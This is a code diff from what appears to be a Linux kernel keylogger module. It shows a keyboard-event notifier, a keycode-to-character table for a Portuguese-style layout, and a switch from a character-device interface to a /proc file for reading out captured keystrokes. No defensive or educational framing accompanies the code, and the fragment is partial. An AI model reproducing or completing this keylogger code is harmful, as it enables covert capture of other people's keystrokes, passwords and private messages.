@@ -3,18 +3,9 @@
 
 int keyboard_listener(struct notifier_block *nblock, unsigned long code, void *_param);
 char convertKeycode2Character(int keycode,int shift);
-int init_dev_file();
-void clear_dev_file();
-ssize_t read_dev_file(struct file *f, char __user *buf, size_t len, loff_t *off);
-ssize_t write_dev_file(struct file *f, const char __user *buf, size_t len, loff_t *off);
-
-/* declare handlers for each operation on character device */
-static struct file_operations dev_fops =
-{
-  .owner = THIS_MODULE,
-  .read = read_dev_file,
-  .write = write_dev_file 
-};
+int init_proc_file(void);
+void clear_proc_file(void);
+int read_proc_file(char *buffer,char **buffer_location,off_t offset, int buffer_length, int *eof, void *data);
 
 /* declare keyboard_listener as the handler of keyboard events */
 static struct notifier_block nb = {
@@ -54,7 +45,6 @@ char convertKeycode2Character(int keycode,int shift) {
 		case 45: return shift ? 'X' : 'x';
 		case 21: return shift ? 'Y' : 'y';
 		case 44: return shift ? 'Z' : 'z';
-		case 39: return shift ? 'Ç' : 'ç';
 		case 2:  return shift ? '!' : '1';
 		case 3:  return shift ? '"' : '2';
 		case 4:  return shift ? '#' : '3';
@@ -66,7 +56,6 @@ char convertKeycode2Character(int keycode,int shift) {
 		case 10:  return shift ? ')' : '9';
 		case 11:  return shift ? '=' : '0';
 		case 13: return shift ? '*' : '+';
-		case 27: return shift ? '`' : '´';
 		case 43: return shift ? '\\' : '|';
 		case 40: return shift ? '^' : '~';
 		case 53: return shift ? '_' : '-';
